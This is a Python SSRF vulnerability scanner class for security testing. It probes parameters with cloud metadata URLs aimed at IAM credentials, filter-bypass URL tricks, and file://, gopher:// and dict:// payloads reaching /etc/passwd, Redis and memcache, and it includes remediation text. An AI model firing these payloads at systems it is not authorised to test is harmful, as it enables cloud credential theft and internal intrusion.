"""
ssrf_detector.py
----------------
Detects Server-Side Request Forgery (SSRF) vulnerabilities.

Five sub-checks:
  1. Basic SSRF       – inject metadata URL into url/uri params, see if response leaks data
  2. Blind SSRF       – inject a callback URL (Burp Collaborator / ngrok) — skipped if no
                        --callback provided
  3. SSRF via Redirect– inject a URL that redirects to the metadata endpoint
  4. Protocol Smuggling– try file://, dict://, gopher:// schemes
  5. Partial SSRF     – server fetches external URLs but filters partially (bypass via @, [])

All findings include the payload used and a body preview as forensic evidence.
"""

import re
import time
import requests
from urllib.parse import quote as _urlquote


class SSRFDetector:

    # Cloud metadata endpoints
    METADATA_URLS = [
        'http://169.254.169.254/latest/meta-data/',          # AWS IMDSv1
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data/',
        'http://metadata.google.internal/computeMetadata/v1/',   # GCP
        'http://169.254.169.254/computeMetadata/v1/',
        'http://169.254.169.254/metadata/instance',          # Azure
    ]

    # Patterns that indicate a metadata response was returned
    METADATA_PATTERNS = [
        r'AKIA[0-9A-Z]{16}',           # AWS access key
        r'ami-[0-9a-f]{8,17}',         # AWS AMI ID
        r'ip-\d+-\d+-\d+-\d+\.ec2\.internal',  # AWS internal hostname
        r'"accessKeyId"\s*:',           # AWS creds JSON key
        r'computeMetadata',             # GCP marker
        r'x-ms-azure',                  # Azure marker
        r'"instanceId"\s*:',            # Generic cloud
        r'169\.254\.169\.254',          # Raw IP reflected back
    ]

    # Protocol smuggling payloads
    PROTOCOL_PAYLOADS = [
        'file:///etc/passwd',
        'file:///etc/hostname',
        'dict://localhost:11211/',      # Memcache
        'gopher://localhost:6379/_',    # Redis
        'ftp://localhost:21/',
    ]

    def __init__(self, callback_url: str = None, delay: float = 0.0,
                 verify: bool = True, proxy: str = None, verbose: bool = False):
        """
        callback_url : Burp Collaborator / ngrok URL for blind SSRF.
                       If None, blind SSRF check is skipped entirely.
        delay        : seconds to sleep between requests (rate limiting).
        verify       : set False to skip TLS certificate verification.
        proxy        : HTTP proxy URL e.g. 'http://127.0.0.1:8080'.
        verbose      : print every request URL + payload to stdout.
        """
        self.callback_url = callback_url   # None = skip blind SSRF
        self.delay        = delay
        self.verify       = verify
        self.proxies      = {'http': proxy, 'https': proxy} if proxy else None
        self.verbose      = verbose

    # ------------------------------------------------------------------ #
    #  Entry point                                                         #
    # ------------------------------------------------------------------ #

    def test_endpoint(self, method: str, full_url: str, url_params: list, token: str) -> list:
        """
        Run all SSRF checks on a single endpoint.

        full_url   : fully-resolved URL (base_url + path with IDs substituted)
        url_params : list of param dicts that look like URL inputs
        token      : Bearer token string

        Returns list of finding dicts.
        """
        findings = []

        for param in url_params:
            findings += self._basic_ssrf(method, full_url, param, token)
            findings += self._blind_ssrf(method, full_url, param, token)
            findings += self._redirect_ssrf(method, full_url, param, token)
            findings += self._protocol_smuggling(method, full_url, param, token)
            findings += self._partial_ssrf(method, full_url, param, token)

        return findings

    # ------------------------------------------------------------------ #
    #  Sub-checks                                                          #
    # ------------------------------------------------------------------ #

    def _basic_ssrf(self, method, url, param, token) -> list:
        """Inject metadata URLs; check if response body contains metadata patterns."""
        findings = []
        for payload in self.METADATA_URLS:
            if self.verbose:
                print(f'      [SSRF] Basic  param={param["name"]}  payload={payload}')
            resp = self._request(method, url, token, param['name'], payload, param['in'])
            if resp and self._contains_metadata(resp.text):
                findings.append(self._make_finding(
                    check='Basic SSRF',
                    url=url,
                    param=param['name'],
                    payload=payload,
                    status=resp.status_code,
                    body_preview=resp.text[:400],
                    severity='CRITICAL',
                    description=(
                        'The server fetched a cloud metadata endpoint and returned its contents. '
                        'This allows an attacker to steal IAM credentials and take over the cloud account.'
                    ),
                ))
                break   # one finding per param is enough
        return findings

    def _blind_ssrf(self, method, url, param, token) -> list:
        """
        Inject a callback URL and check if the server reflects it in the response.

        True blind SSRF confirmation requires an out-of-band listener (Burp
        Collaborator / ngrok) — the scanner cannot observe DNS/HTTP hits on its
        own. This check is a best-effort in-band signal: if the server echoes
        the callback URL in its response body, the request was likely processed.

        Skipped entirely when no --callback URL was provided.
        """
        if not self.callback_url:
            return []   # no callback configured — skip rather than fire useless requests

        if self.verbose:
            print(f'      [SSRF] Blind  param={param["name"]}  callback={self.callback_url}')

        resp = self._request(method, url, token, param['name'], self.callback_url, param['in'])
        # Only flag if the callback URL is reflected in the response body.
        # A plain 200 response (without the URL in the body) is not evidence of
        # SSRF — it just means the server didn't reject the input, which is normal
        # for many endpoints and would cause high false-positive rates.
        if resp and self.callback_url in resp.text:
            return [self._make_finding(
                check='Blind SSRF',
                url=url,
                param=param['name'],
                payload=self.callback_url,
                status=resp.status_code,
                body_preview=resp.text[:200],
                severity='HIGH',
                description=(
                    f'Server reflected the callback URL "{self.callback_url}" in its response body, '
                    'suggesting the URL was processed server-side. '
                    'Verify with your out-of-band listener (Burp Collaborator / ngrok) '
                    'to confirm an actual outbound DNS/HTTP request was made.'
                ),
            )]
        return []

    def _redirect_ssrf(self, method, url, param, token) -> list:
        """
        Inject a URL that *redirects* to a metadata endpoint.
        Some filters block direct metadata IPs but follow open redirects.
        """
        redirect_payloads = [
            'http://169.254.169.254.nip.io/latest/meta-data/',   # DNS rebinding-style
            'http://[::ffff:169.254.169.254]/latest/meta-data/',  # IPv6 mapped
            'http://0.0.0.0/latest/meta-data/',                   # SSRF bypass
            'http://localhost@169.254.169.254/latest/meta-data/', # @ trick
        ]
        findings = []
        for payload in redirect_payloads:
            if self.verbose:
                print(f'      [SSRF] Redirect  param={param["name"]}  payload={payload}')
            resp = self._request(method, url, token, param['name'], payload, param['in'])
            if resp and self._contains_metadata(resp.text):
                findings.append(self._make_finding(
                    check='SSRF via Redirect / Filter Bypass',
                    url=url,
                    param=param['name'],
                    payload=payload,
                    status=resp.status_code,
                    body_preview=resp.text[:400],
                    severity='CRITICAL',
                    description='URL-filter bypass allowed SSRF to the metadata endpoint via a non-standard representation.',
                ))
                break
        return findings

    def _protocol_smuggling(self, method, url, param, token) -> list:
        """Try non-HTTP schemes to reach internal services."""
        findings = []
        for payload in self.PROTOCOL_PAYLOADS:
            if self.verbose:
                print(f'      [SSRF] Protocol  param={param["name"]}  payload={payload}')
            resp = self._request(method, url, token, param['name'], payload, param['in'])
            if resp and resp.status_code == 200 and resp.content:
                if 'root:' in resp.text or 'localhost' in resp.text:
                    findings.append(self._make_finding(
                        check='Protocol Smuggling SSRF',
                        url=url,
                        param=param['name'],
                        payload=payload,
                        status=resp.status_code,
                        body_preview=resp.text[:400],
                        severity='CRITICAL',
                        description=f'Non-HTTP scheme "{payload.split("://")[0]}" was not blocked. Server read an internal file or service.',
                    ))
        return findings

    def _partial_ssrf(self, method, url, param, token) -> list:
        """
        Partial SSRF: server allows fetching some URLs but has a filter.
        We probe edge cases like whitelisted-domain@evil.com or DNS rebinding.
        """
        findings = []
        bypass_payloads = [
            'http://169.254.169.254@trusted.com/latest/meta-data/',  # URL authority bypass
            'http://trusted.com#@169.254.169.254/latest/meta-data/', # fragment trick
            'http://169.254.169.254%09/latest/meta-data/',           # tab character encoding
        ]
        for payload in bypass_payloads:
            if self.verbose:
                print(f'      [SSRF] Partial  param={param["name"]}  payload={payload}')
            resp = self._request(method, url, token, param['name'], payload, param['in'])
            if resp and self._contains_metadata(resp.text):
                findings.append(self._make_finding(
                    check='Partial SSRF (Filter Bypass)',
                    url=url,
                    param=param['name'],
                    payload=payload,
                    status=resp.status_code,
                    body_preview=resp.text[:400],
                    severity='HIGH',
                    description='SSRF filter was bypassed using URL encoding / authority tricks.',
                ))
                break
        return findings

    # ------------------------------------------------------------------ #
    #  Helpers                                                             #
    # ------------------------------------------------------------------ #

    def _request(self, method, url, token, param_name, payload, param_in) -> requests.Response | None:
        """Send a single SSRF probe request with optional rate-limit retry (429 backoff)."""
        headers = {'Authorization': f'Bearer {token}'}
        for attempt in range(3):
            try:
                if param_in in ('query', 'path'):
                    sep = '&' if '?' in url else '?'
                    # URL-encode the payload so characters like #, &, = inside it
                    # are treated as literal data, not URL syntax.  Without this,
                    # a '#' in a bypass payload (e.g. http://trusted.com#@evil.com)
                    # is interpreted as a fragment separator and everything after it
                    # is silently stripped before the request is sent.
                    encoded_payload = _urlquote(payload, safe='')
                    resp = requests.request(
                        method, f'{url}{sep}{param_name}={encoded_payload}',
                        headers=headers, timeout=8, allow_redirects=True,
                        verify=self.verify, proxies=self.proxies,
                    )
                else:   # body / header param
                    resp = requests.request(
                        method, url, headers=headers,
                        json={param_name: payload}, timeout=8,
                        verify=self.verify, proxies=self.proxies,
                    )
                if resp.status_code == 429:
                    wait = (2 ** attempt) * max(self.delay, 1.0)
                    if self.verbose:
                        print(f'      [SSRF] 429 rate-limited — retrying in {wait:.1f}s')
                    time.sleep(wait)
                    continue
                if self.delay > 0:
                    time.sleep(self.delay)
                return resp
            except requests.RequestException:
                return None
        return None   # all retries exhausted

    def _contains_metadata(self, text: str) -> bool:
        """Return True if the response body matches any known cloud metadata pattern."""
        for pattern in self.METADATA_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _make_finding(self, check, url, param, payload, status, body_preview, severity, description) -> dict:
        return {
            'type':      'SSRF',
            'check':     check,
            'vulnerable': True,
            'severity':   severity,
            'endpoint':   url,
            'parameter':  param,
            'evidence': {
                'payload':      payload,
                'status_code':  status,
                'body_preview': body_preview,
            },
            'description': description,
            'remediation': (
                'Implement an allowlist of permitted destination URLs/IPs. '
                'Block requests to RFC 1918 private ranges (10.x, 172.16-31.x, 192.168.x) '
                'and 169.254.169.254. Disable HTTP redirects in server-side fetch calls. '
                'Block non-HTTP(S) schemes at the application layer.'
            ),
        }
